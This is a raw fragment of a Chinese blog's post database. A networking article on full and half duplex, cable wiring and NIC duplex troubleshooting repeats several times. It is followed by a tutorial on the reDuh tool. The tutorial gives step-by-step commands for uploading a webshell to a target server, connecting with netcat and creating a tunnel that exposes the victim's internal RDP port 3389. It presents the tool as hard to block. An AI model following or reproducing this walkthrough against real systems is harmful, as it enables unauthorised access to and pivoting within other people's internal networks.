style=\"\">&nbsp;&nbsp;&nbsp;在串行通信中,数据通常是在两个站(如终端和微机)之间进行传送,按照数据流的方向可分成三种基本的传送方式:全双工、半双工、和单工.但单工目前已很少采用,下面仅介绍前两种方式.&nbsp;<br /><br />1&nbsp;、全双工方式(&nbsp;full&nbsp;duplex&nbsp;)<br />&nbsp;&nbsp;&nbsp;当数据的发送和接收分流,分别由两根不同的传输线传送时,通信双方都能在同一时刻进行发送和接收操作,这样的传送方式就是全双工制.在全双工方式下,通信系统的每一端都设置了发送器和接收器,因此,能控制数据同时在两个方向上传送.全双工方式无需进行方向的切换,因此,没有切换操作所产生的时间延迟,这对那些不能有时间延误的交互式应用(例如远程监测和控制系统)十分有利.这种方式要求通讯双方均有发送器和接收器,同时,需要&nbsp;2&nbsp;根数据线传送数据信号.(可能还需要控制线和状态线,以及地线).&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;比如,计算机主机用串行接口连接显示终端,而显示终端带有键盘.这样,一方面键盘上输入的字符送到主机内存;另一方面,主机内存的信息可以送到屏幕显示.通常,往键盘上打入&nbsp;1&nbsp;个字符以后,先不显示,计算机主机收到字符后,立即回送到终端,然后终端再把这个字符显示出来.这样,前一个字符的回送过程和后一个字符的输入过程是同时进行的,即工作于全双工方式.&nbsp;<br /><br />2&nbsp;、半双式方式(&nbsp;half&nbsp;duplex&nbsp;)&nbsp;<br />&nbsp;&nbsp;&nbsp;若使用同一根传输线既作接收又作发送,虽然数据可以在两个方向上传送,但通信双方不能同时收发数据,这样的传送方式就是半双工制.采用半双工方式时,通信系统每一端的发送器和接收器,通过收&nbsp;/&nbsp;发开关转接到通信线上,进行方向的切换,因此,会产生时间延迟.收&nbsp;/&nbsp;发开关实际上是由软件控制的电子开关.&nbsp;<br />当计算机主机用串行接口连接显示终端时,在半双工方式中,输入过程和输出过程使用同一通路.有些计算机和显示终端之间采用半双工方式工作,这时,从键盘打入的字符在发送到主机的同时就被送到终端上显示出来,而不是用回送的办法,所以避免了接收过程和发送过程同时进行的情况.&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;目前多数终端和串行接口都为半双工方式提供了换向能力,也为全双工方式提供了两条独立的引脚.在实际使用时,一般并不需要通信双方同时既发送又接收,像打印机这类的单向传送设备,半双工甚至单工就能胜任,也无需倒向.</p><p style=\"\"><strong>全双工模式和半双工模式在网卡中的区别&nbsp;<br /><br /></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在全双工模式下，8根线都要分别接到水晶头相应的线序位置上；<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，只需接4根线，参照T568B标准，一般使用1&nbsp;、2、3、6&nbsp;线序位置上的四根线，即：白橙、橙、白绿、绿&nbsp;四根线；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;白橙、橙&nbsp;用于发送数据&nbsp;，白绿、绿&nbsp;用于接收数据。&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式下，网线最大可以达到100兆以上的速度；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，网线能达到的速度通常为10兆左右。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式的网线既可以工作于全双工模式，也可以工作于半双工模式；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但半双工模式的网线不能工作于全双工模式。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，多出来的两组线可以用来接电话线，比如：把“白蓝、蓝”&nbsp;这组线分出来当电话线使用。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在局域网网络布线中，用这种方式可以节省布线成本，一根双绞线同时当网线和电话线使用。<br /><br /><strong>巧用网卡的半双工模式解决网络连接故障</strong><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一根全双工模式的网线内部有一根或几根线短路或接触不良，比如蓝色线组或棕色线组有问题，那么，把网卡改为半双工模式，就可以避免使用有问题的蓝色线组或棕色线组，从而解决网络连接不稳定、掉线等故障。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网卡属性中可以设置全双工或半双工模式。</p><img src=\"/images/pic/811921753912b31bc2f5e6888618367adbb4e109.jpg\" /><p style=\"\"><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如上图所示，用鼠标右键单击“本地连接”，在弹出菜单中点击“属性”，进入“本地连接&nbsp;属性”界面；<br />点击（网卡）“配置”按钮，点“高级”标签，选中“Speed&nbsp;＆&nbsp;Duplex”；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可用的模式一般有“Auto”&nbsp;、“10&nbsp;Mb&nbsp;Half”&nbsp;、“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”、“100&nbsp;Mb&nbsp;Full”等。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认设置为auto&nbsp;。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果网络连接有问题，比如：<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能自动获得IP地址；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示网络连接受限制；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;手动设置IP地址后，虽然显示网络连接正常，但是只有发送的数据包，没有收到的数据包，或者收到的数据包非常少。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，修改“Speed&nbsp;＆&nbsp;Duplex”的“值”为&nbsp;“10&nbsp;Mb&nbsp;Half”&nbsp;，也可以改为“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”模式试试；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用这种方法可以解决大部分网络连接故障。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果这种方法没能解决问题，就只有更换网线或水晶头，甚至更换网卡了！<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于半双工模式下，对网速有一定影响，因此，如果网线、网卡或交换机等设备没有问题，尽量让网\n","slug":"全双工与半双工的区别-网线水晶头-排线顺序","published":1,"updated":"2023-04-22T05:38:44.996Z","_id":"clgrjlxjt007p7opif3ybhf37","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天回家网络出问题了，播不号了，pppoe一直连接着。感觉网线坏了或者对端交换机口DOWN了，于是叫小区宽带工作人员看看。他大爷的让我重起计算机，哥以前也是学网络的啊，重启管毛，忽悠哥阿。于是把他给弄到家来了，让他看看。他连接也不行，最后修改了一下网卡属性，为10M半双工，我晕好了，好尴尬阿。他走了，百度之，原来是线有问题了，安&#39;普的破线，假的吧。应该是8根线坏了几根，搞的全双工不行了，只能半双工了。速度肯定不行阿，这个问题感觉应该也是自动协商的BUG把，没有初始化一下吗。废话不多说，看下面的吧。<br /></p><p><br /></p><p><br /></p><div><div>全双工与半双工的区别&nbsp;网线水晶头&nbsp;排线顺序</div><div>全双工传输<p style=\"\">英文写法是:Full－Duplex&nbsp;Transmissions</p><p style=\"\">是指交换机在发送数据的同时也能够接收数据，两者同步进行，这好像我们平时打电话一样，说话的同时也能够听到对方的声音。目前的交换机都支持全双工。<br /><br />全双工的好处在于迟延小，速度快。<br /><br />与之对应的是【半双工】这个概念:就是指一个时间段内只有一个动作发生，举个简单例子，一天窄窄的马路，同时只能有一辆车通过，当目前有两量车对开，这种情况下就只能一辆先过，等到头儿后另一辆再开，这个例子就形象的说明了半双工的原理。早期的对讲机、以及早期集线器等设备都是实行半双工的产品。随着技术的不断进步，半双工会逐渐退出历史舞台。</p><strong>全双工与半双工</strong><p style=\"\">&nbsp;&nbsp;&nbsp;在串行通信中,数据通常是在两个站(如终端和微机)之间进行传送,按照数据流的方向可分成三种基本的传送方式:全双工、半双工、和单工.但单工目前已很少采用,下面仅介绍前两种方式.&nbsp;<br /><br />1&nbsp;、全双工方式(&nbsp;full&nbsp;duplex&nbsp;)<br />&nbsp;&nbsp;&nbsp;当数据的发送和接收分流,分别由两根不同的传输线传送时,通信双方都能在同一时刻进行发送和接收操作,这样的传送方式就是全双工制.在全双工方式下,通信系统的每一端都设置了发送器和接收器,因此,能控制数据同时在两个方向上传送.全双工方式无需进行方向的切换,因此,没有切换操作所产生的时间延迟,这对那些不能有时间延误的交互式应用(例如远程监测和控制系统)十分有利.这种方式要求通讯双方均有发送器和接收器,同时,需要&nbsp;2&nbsp;根数据线传送数据信号.(可能还需要控制线和状态线,以及地线).&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;比如,计算机主机用串行接口连接显示终端,而显示终端带有键盘.这样,一方面键盘上输入的字符送到主机内存;另一方面,主机内存的信息可以送到屏幕显示.通常,往键盘上打入&nbsp;1&nbsp;个字符以后,先不显示,计算机主机收到字符后,立即回送到终端,然后终端再把这个字符显示出来.这样,前一个字符的回送过程和后一个字符的输入过程是同时进行的,即工作于全双工方式.&nbsp;<br /><br />2&nbsp;、半双式方式(&nbsp;half&nbsp;duplex&nbsp;)&nbsp;<br />&nbsp;&nbsp;&nbsp;若使用同一根传输线既作接收又作发送,虽然数据可以在两个方向上传送,但通信双方不能同时收发数据,这样的传送方式就是半双工制.采用半双工方式时,通信系统每一端的发送器和接收器,通过收&nbsp;/&nbsp;发开关转接到通信线上,进行方向的切换,因此,会产生时间延迟.收&nbsp;/&nbsp;发开关实际上是由软件控制的电子开关.&nbsp;<br />当计算机主机用串行接口连接显示终端时,在半双工方式中,输入过程和输出过程使用同一通路.有些计算机和显示终端之间采用半双工方式工作,这时,从键盘打入的字符在发送到主机的同时就被送到终端上显示出来,而不是用回送的办法,所以避免了接收过程和发送过程同时进行的情况.&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;目前多数终端和串行接口都为半双工方式提供了换向能力,也为全双工方式提供了两条独立的引脚.在实际使用时,一般并不需要通信双方同时既发送又接收,像打印机这类的单向传送设备,半双工甚至单工就能胜任,也无需倒向.</p><p style=\"\"><strong>全双工模式和半双工模式在网卡中的区别&nbsp;<br /><br /></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在全双工模式下，8根线都要分别接到水晶头相应的线序位置上；<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，只需接4根线，参照T568B标准，一般使用1&nbsp;、2、3、6&nbsp;线序位置上的四根线，即：白橙、橙、白绿、绿&nbsp;四根线；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;白橙、橙&nbsp;用于发送数据&nbsp;，白绿、绿&nbsp;用于接收数据。&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式下，网线最大可以达到100兆以上的速度；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，网线能达到的速度通常为10兆左右。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式的网线既可以工作于全双工模式，也可以工作于半双工模式；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但半双工模式的网线不能工作于全双工模式。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，多出来的两组线可以用来接电话线，比如：把“白蓝、蓝”&nbsp;这组线分出来当电话线使用。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在局域网网络布线中，用这种方式可以节省布线成本，一根双绞线同时当网线和电话线使用。<br /><br /><strong>巧用网卡的半双工模式解决网络连接故障</strong><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一根全双工模式的网线内部有一根或几根线短路或接触不良，比如蓝色线组或棕色线组有问题，那么，把网卡改为半双工模式，就可以避免使用有问题的蓝色线组或棕色线组，从而解决网络连接不稳定、掉线等故障。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网卡属性中可以设置全双工或半双工模式。</p><img src=\"/images/pic/811921753912b31bc2f5e6888618367adbb4e109.jpg\" /><p style=\"\"><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如上图所示，用鼠标右键单击“本地连接”，在弹出菜单中点击“属性”，进入“本地连接&nbsp;属性”界面；<br />点击（网卡）“配置”按钮，点“高级”标签，选中“Speed&nbsp;＆&nbsp;Duplex”；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可用的模式一般有“Auto”&nbsp;、“10&nbsp;Mb&nbsp;Half”&nbsp;、“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”、“100&nbsp;Mb&nbsp;Full”等。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认设置为auto&nbsp;。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果网络连接有问题，比如：<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能自动获得IP地址；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示网络连接受限制；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;手动设置IP地址后，虽然显示网络连接正常，但是只有发送的数据包，没有收到的数据包，或者收到的数据包非常少。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，修改“Speed&nbsp;＆&nbsp;Duplex”的“值”为&nbsp;“10&nbsp;Mb&nbsp;Half”&nbsp;，也可以改为“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”模式试试；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用这种方法可以解决大部分网络连接故障。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果这种方法没能解决问题，就只有更换网线或水晶头，甚至更换网卡了！<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于半双工模式下，对网速有一定影响，因此，如果网线、网卡或交换机等设备没有问题，尽量让网\n","site":{"data":{}},"excerpt":"","more":"<p>今天回家网络出问题了，播不号了，pppoe一直连接着。感觉网线坏了或者对端交换机口DOWN了，于是叫小区宽带工作人员看看。他大爷的让我重起计算机，哥以前也是学网络的啊，重启管毛，忽悠哥阿。于是把他给弄到家来了，让他看看。他连接也不行，最后修改了一下网卡属性，为10M半双工，我晕好了，好尴尬阿。他走了，百度之，原来是线有问题了，安&#39;普的破线，假的吧。应该是8根线坏了几根，搞的全双工不行了，只能半双工了。速度肯定不行阿，这个问题感觉应该也是自动协商的BUG把，没有初始化一下吗。废话不多说，看下面的吧。<br /></p><p><br /></p><p><br /></p><div><div>全双工与半双工的区别&nbsp;网线水晶头&nbsp;排线顺序</div><div>全双工传输<p style=\"\">英文写法是:Full－Duplex&nbsp;Transmissions</p><p style=\"\">是指交换机在发送数据的同时也能够接收数据，两者同步进行，这好像我们平时打电话一样，说话的同时也能够听到对方的声音。目前的交换机都支持全双工。<br /><br />全双工的好处在于迟延小，速度快。<br /><br />与之对应的是【半双工】这个概念:就是指一个时间段内只有一个动作发生，举个简单例子，一天窄窄的马路，同时只能有一辆车通过，当目前有两量车对开，这种情况下就只能一辆先过，等到头儿后另一辆再开，这个例子就形象的说明了半双工的原理。早期的对讲机、以及早期集线器等设备都是实行半双工的产品。随着技术的不断进步，半双工会逐渐退出历史舞台。</p><strong>全双工与半双工</strong><p style=\"\">&nbsp;&nbsp;&nbsp;在串行通信中,数据通常是在两个站(如终端和微机)之间进行传送,按照数据流的方向可分成三种基本的传送方式:全双工、半双工、和单工.但单工目前已很少采用,下面仅介绍前两种方式.&nbsp;<br /><br />1&nbsp;、全双工方式(&nbsp;full&nbsp;duplex&nbsp;)<br />&nbsp;&nbsp;&nbsp;当数据的发送和接收分流,分别由两根不同的传输线传送时,通信双方都能在同一时刻进行发送和接收操作,这样的传送方式就是全双工制.在全双工方式下,通信系统的每一端都设置了发送器和接收器,因此,能控制数据同时在两个方向上传送.全双工方式无需进行方向的切换,因此,没有切换操作所产生的时间延迟,这对那些不能有时间延误的交互式应用(例如远程监测和控制系统)十分有利.这种方式要求通讯双方均有发送器和接收器,同时,需要&nbsp;2&nbsp;根数据线传送数据信号.(可能还需要控制线和状态线,以及地线).&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;比如,计算机主机用串行接口连接显示终端,而显示终端带有键盘.这样,一方面键盘上输入的字符送到主机内存;另一方面,主机内存的信息可以送到屏幕显示.通常,往键盘上打入&nbsp;1&nbsp;个字符以后,先不显示,计算机主机收到字符后,立即回送到终端,然后终端再把这个字符显示出来.这样,前一个字符的回送过程和后一个字符的输入过程是同时进行的,即工作于全双工方式.&nbsp;<br /><br />2&nbsp;、半双式方式(&nbsp;half&nbsp;duplex&nbsp;)&nbsp;<br />&nbsp;&nbsp;&nbsp;若使用同一根传输线既作接收又作发送,虽然数据可以在两个方向上传送,但通信双方不能同时收发数据,这样的传送方式就是半双工制.采用半双工方式时,通信系统每一端的发送器和接收器,通过收&nbsp;/&nbsp;发开关转接到通信线上,进行方向的切换,因此,会产生时间延迟.收&nbsp;/&nbsp;发开关实际上是由软件控制的电子开关.&nbsp;<br />当计算机主机用串行接口连接显示终端时,在半双工方式中,输入过程和输出过程使用同一通路.有些计算机和显示终端之间采用半双工方式工作,这时,从键盘打入的字符在发送到主机的同时就被送到终端上显示出来,而不是用回送的办法,所以避免了接收过程和发送过程同时进行的情况.&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;目前多数终端和串行接口都为半双工方式提供了换向能力,也为全双工方式提供了两条独立的引脚.在实际使用时,一般并不需要通信双方同时既发送又接收,像打印机这类的单向传送设备,半双工甚至单工就能胜任,也无需倒向.</p><p style=\"\"><strong>全双工模式和半双工模式在网卡中的区别&nbsp;<br /><br /></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在全双工模式下，8根线都要分别接到水晶头相应的线序位置上；<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，只需接4根线，参照T568B标准，一般使用1&nbsp;、2、3、6&nbsp;线序位置上的四根线，即：白橙、橙、白绿、绿&nbsp;四根线；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;白橙、橙&nbsp;用于发送数据&nbsp;，白绿、绿&nbsp;用于接收数据。&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式下，网线最大可以达到100兆以上的速度；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，网线能达到的速度通常为10兆左右。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式的网线既可以工作于全双工模式，也可以工作于半双工模式；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但半双工模式的网线不能工作于全双工模式。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，多出来的两组线可以用来接电话线，比如：把“白蓝、蓝”&nbsp;这组线分出来当电话线使用。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在局域网网络布线中，用这种方式可以节省布线成本，一根双绞线同时当网线和电话线使用。<br /><br /><strong>巧用网卡的半双工模式解决网络连接故障</strong><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一根全双工模式的网线内部有一根或几根线短路或接触不良，比如蓝色线组或棕色线组有问题，那么，把网卡改为半双工模式，就可以避免使用有问题的蓝色线组或棕色线组，从而解决网络连接不稳定、掉线等故障。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网卡属性中可以设置全双工或半双工模式。</p><img src=\"/images/pic/811921753912b31bc2f5e6888618367adbb4e109.jpg\" /><p style=\"\"><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如上图所示，用鼠标右键单击“本地连接”，在弹出菜单中点击“属性”，进入“本地连接&nbsp;属性”界面；<br />点击（网卡）“配置”按钮，点“高级”标签，选中“Speed&nbsp;＆&nbsp;Duplex”；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可用的模式一般有“Auto”&nbsp;、“10&nbsp;Mb&nbsp;Half”&nbsp;、“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”、“100&nbsp;Mb&nbsp;Full”等。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认设置为auto&nbsp;。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果网络连接有问题，比如：<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能自动获得IP地址；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示网络连接受限制；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;手动设置IP地址后，虽然显示网络连接正常，但是只有发送的数据包，没有收到的数据包，或者收到的数据包非常少。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，修改“Speed&nbsp;＆&nbsp;Duplex”的“值”为&nbsp;“10&nbsp;Mb&nbsp;Half”&nbsp;，也可以改为“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”模式试试；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用这种方法可以解决大部分网络连接故障。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果这种方法没能解决问题，就只有更换网线或水晶头，甚至更换网卡了！<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于半双工模式下，对网速有一定影响，因此，如果网线、网卡或交换机等设备没有问题，尽量让网\n"},{"title":"内网渗透利器--reDuh（webshell跳板）简单使用说明","date":"2011-10-21T09:57:00.000Z","_content":"<p>很给力的工具，就是速度稍微有点慢，也不怕被墙。</p><p>&nbsp;</p><p>作者：<a href=\"http://www.sai52.com/archives/848/\" target=\"_blank\" rel=\"noopener noreferrer\">sai52[B.H.S.T]</a></p><p>国外大牛的作品，偶顺手写了个使用说明。E文好的看原文&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.sensepost.com/research/reDuh/</a></p><p>这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p><p>本机-------客户端---------（http隧道）-----------服务端------------------内网服务器</p><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本机执行最好装上JDK。<br /></p><p>把客户端文件解包，这里我把它放到E盘的TEST文件夹</p><p><a href=\"http://huaidan.org/images/2009/03/011.png\"><img src=\"/images/pic/8bcd4bae38a2ff7a4b36d69a.jpg\" width=\"500\" height=\"239\" /></a><br />图01</p><p>把服务端的webshell上传到目标服务器。</p><p><a href=\"http://huaidan.org/images/2009/03/021.png\"><img src=\"/images/pic/b694b1ec8244c245acafd59a.jpg\" width=\"386\" height=\"206\" /></a><br />图02</p><p>目标服务器在内网，开了终端服务。</p><p><a href=\"http://huaidan.org/images/2009/03/031.png\"><img src=\"/images/pic/4cd60c0abe7b25dc2eddd49a.jpg\" width=\"499\" height=\"413\" /></a><br />图03</p><p>命令行下用客户端连接服务端</p><p>E:test&gt;java reDuhClient 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>liunx下面</p><p>chmod +x reDuchClient.jar</p><p>./reDuchClient.jar 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>现在版本更新了，命令也有所改变，自己看一个帮助吧。或者直接程序文件不加参数，会给你提示的</p><p><a href=\"http://huaidan.org/images/2009/03/041.png\"><img src=\"/images/pic/0a297beac532a84cb80e2d80.jpg\" width=\"500\" height=\"112\" /></a><br />图04</p><p>新开一个命令行，用NC连接本机1010端口。</p><p>H:&gt;nc -vv localhost 1010</p><p><a href=\"http://huaidan.org/images/2009/03/051.png\"><img src=\"/images/pic/86d04302dc0c317d7bec2c80.jpg\" width=\"499\" height=\"96\" /></a><br />图05</p><p>连接成功会有欢迎提示，之后输入命令</p><p>&gt;&gt;[createTunnel]1234:127.0.0.1:3389</p><p>前面的1234是本机连接用的端口，中间的ip地址是目标服务器的（可以是webshell所在服务器也可以是和它同内网的服务器），后面的3389是欲连接目标服务器的端口。</p><p>成功后两个命令行窗口都会有成功提示。</p><p><a href=\"http://huaidan.org/images/2009/03/061.png\"><img src=\"/images/pic/be385b3c463df29f54e72380.jpg\" width=\"500\" height=\"121\" /></a><br />图06</p><p><a href=\"http://huaidan.org/images/2009/03/071.png\"><img src=\"/images/pic/f13031355ae2a7aea3cc2b9a.jpg\" width=\"500\" height=\"135\" /></a><br />图07</p><p>这时通道已经建立，你连接本机的1234端口就相当于连接到目标服务器的3389端口了。</p><p><a href=\"http://huaidan.org/images/2009/03/081.png\"><img src=\"/images/pic/cc0fd6acd9902abf7cd92a9a.jpg\" width=\"407\" height=\"231\" /></a><br />图08</p><p><a href=\"http://huaidan.org/images/2009/03/091.png\"><img src=\"/images/pic/a606c20d84dfdd9436d12280.jpg\" width=\"499\" height=\"243\" /></a><br />图09</p><p>数据的传递过程</p><p><a href=\"http://huaidan.org/images/2009/03/101.png\"><img src=\"/images/pic/3f3701ef54d3bfa22f2e2180.jpg\" width=\"499\" height=\"134\" /></a><br />图10</p><p>需要注意的是用此工具转发数据速度很慢，连接的时候应尽量把mstsc的颜色设置调低些。</p><p>reDuh客户端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuhClient-0.3.zip\" target=\"_blank\" rel=\"noopener noreferrer\">reduhclient-0.3.zip</a><br />reDuh服务端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuh-server-all.tgz\" target=\"_blank\" rel=\"noopener noreferrer\">reduh-server-all.gz</a></p>","source":"_posts/内网渗透利器--reDuh（webshell跳板）简单使用说明.md","raw":"title: 内网渗透利器--reDuh（webshell跳板）简单使用说明\ncategories: [网络安全]\ntags: []\ndate: 2011-10-21 17:57:00\n---\n<p>很给力的工具，就是速度稍微有点慢，也不怕被墙。</p><p>&nbsp;</p><p>作者：<a href=\"http://www.sai52.com/archives/848/\" target=\"_blank\" rel=\"noopener noreferrer\">sai52[B.H.S.T]</a></p><p>国外大牛的作品，偶顺手写了个使用说明。E文好的看原文&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.sensepost.com/research/reDuh/</a></p><p>这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p><p>本机-------客户端---------（http隧道）-----------服务端------------------内网服务器</p><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本机执行最好装上JDK。<br /></p><p>把客户端文件解包，这里我把它放到E盘的TEST文件夹</p><p><a href=\"http://huaidan.org/images/2009/03/011.png\"><img src=\"/images/pic/8bcd4bae38a2ff7a4b36d69a.jpg\" width=\"500\" height=\"239\" /></a><br />图01</p><p>把服务端的webshell上传到目标服务器。</p><p><a href=\"http://huaidan.org/images/2009/03/021.png\"><img src=\"/images/pic/b694b1ec8244c245acafd59a.jpg\" width=\"386\" height=\"206\" /></a><br />图02</p><p>目标服务器在内网，开了终端服务。</p><p><a href=\"http://huaidan.org/images/2009/03/031.png\"><img src=\"/images/pic/4cd60c0abe7b25dc2eddd49a.jpg\" width=\"499\" height=\"413\" /></a><br />图03</p><p>命令行下用客户端连接服务端</p><p>E:test&gt;java reDuhClient 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>liunx下面</p><p>chmod +x reDuchClient.jar</p><p>./reDuchClient.jar 目标服务器域名 http 80 /WEBSHELL路径/reDuh.aspx</p><p>现在版本更新了，命令也有所改变，自己看一个帮助吧。或者直接程序文件不加参数，会给你提示的</p><p><a href=\"http://huaidan.org/images/2009/03/041.png\"><img src=\"/images/pic/0a297beac532a84cb80e2d80.jpg\" width=\"500\" height=\"112\" /></a><br />图04</p><p>新开一个命令行，用NC连接本机1010端口。</p><p>H:&gt;nc -vv localhost 1010</p><p><a href=\"http://huaidan.org/images/2009/03/051.png\"><img src=\"/images/pic/86d04302dc0c317d7bec2c80.jpg\" width=\"499\" height=\"96\" /></a><br />图05</p><p>连接成功会有欢迎提示，之后输入命令</p><p>&gt;&gt;[createTunnel]1234:127.0.0.1:3389</p><p>前面的1234是本机连接用的端口，中间的ip地址是目标服务器的（可以是webshell所在服务器也可以是和它同内网的服务器），后面的3389是欲连接目标服务器的端口。</p><p>成功后两个命令行窗口都会有成功提示。</p><p><a href=\"http://huaidan.org/images/2009/03/061.png\"><img src=\"/images/pic/be385b3c463df29f54e72380.jpg\" width=\"500\" height=\"121\" /></a><br />图06</p><p><a href=\"http://huaidan.org/images/2009/03/071.png\"><img src=\"/images/pic/f13031355ae2a7aea3cc2b9a.jpg\" width=\"500\" height=\"135\" /></a><br />图07</p><p>这时通道已经建立，你连接本机的1234端口就相当于连接到目标服务器的3389端口了。</p><p><a href=\"http://huaidan.org/images/2009/03/081.png\"><img src=\"/images/pic/cc0fd6acd9902abf7cd92a9a.jpg\" width=\"407\" height=\"231\" /></a><br />图08</p><p><a href=\"http://huaidan.org/images/2009/03/091.png\"><img src=\"/images/pic/a606c20d84dfdd9436d12280.jpg\" width=\"499\" height=\"243\" /></a><br />图09</p><p>数据的传递过程</p><p><a href=\"http://huaidan.org/images/2009/03/101.png\"><img src=\"/images/pic/3f3701ef54d3bfa22f2e2180.jpg\" width=\"499\" height=\"134\" /></a><br />图10</p><p>需要注意的是用此工具转发数据速度很慢，连接的时候应尽量把mstsc的颜色设置调低些。</p><p>reDuh客户端下载&nbsp; <a href=\"http://www.sensepost.com/research/reDuh/reDuhClient-0.3.zip\" target=\"_blank\" rel=\"noopener noreferrer\">reduhclient-0.3.zip</a><br 